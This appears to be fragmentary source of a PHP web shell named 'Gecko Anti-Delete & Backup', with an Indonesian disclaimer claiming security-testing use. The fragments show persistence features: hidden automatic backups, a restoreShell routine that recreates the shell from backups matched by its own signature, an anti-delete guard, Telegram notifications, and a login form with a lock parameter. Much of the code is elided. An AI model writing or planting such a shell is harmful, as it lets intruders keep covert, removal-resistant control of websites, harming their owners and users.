 ...
 * ============================================================================
 * Tools/script ini dikembangkan untuk tujuan pengujian keamanan (security testing)
 * dan edukasi. Penggunaan di luar konteks tersebut, termasuk namun tidak terbatas
 * pada aktivitas ilegal (hacking tanpa izin, pencurian data, dll.) sepenuhnya
 * menjadi tanggung jawab pengguna. Pengembang tidak bertanggung jawab atas segala
 * bentuk penyalahgunaan atau kerusakan yang timbul.
 *
 * Anda diwajibkan memiliki izin tertulis dari pemilik sistem sebelum menjalankan
 * script ini. Dengan menggunakan script ini, Anda menyetujui ketentuan di atas.
 * ============================================================================
 *
 * Nama Shell: Gecko Anti-Delete & Backup
 * Versi: 2.0 - FULL CODE
 * Fitur: Anti-delete, backup tersembunyi otomatis, notifikasi Telegram
 * Lab: Disediakan oleh pengguna untuk pengujian legal.
 */

session_start();
date_default_timezone_set("Asia/Jakarta");

// ===================== KONFIGURASI ANTI DELETE =====================
...
/**
 * Membuat backup ke lokasi tersembunyi
 */
...
function restoreShell() {
    ...
    foreach ($backupFiles as $backup) {
        if (is_file($backup) && filesize($backup) > 1000) {
            ...
            if (strpos($content, 'Gecko Anti-Delete') !== false || strpos($content, 'session_start') !== false) {
...
/**
 * Guard anti-delete dan backup periodik
 */
...
<head>
    ...
    <style>
        ...
        input[type="submit"] { border:none; padding:5px 20px; background:#2e313d; color:#fff; cursor:pointer; }
        .container { text-align:center; margin-top:20%; }
    </style>
    <title>Gecko Secure Shell</title>
</head>
<body>
<div class="container">
    <form method="post">
...
if (isset($_GET['lockshell'])) {
    // Lock shell dengan anti delete sudah ada di guard, jadi hanya notifikasi
    success();
}
...
$(document).ready(function(){
    ...
    $('#closeEditor').live('click',function(){ $('.code-editor').remove(); });
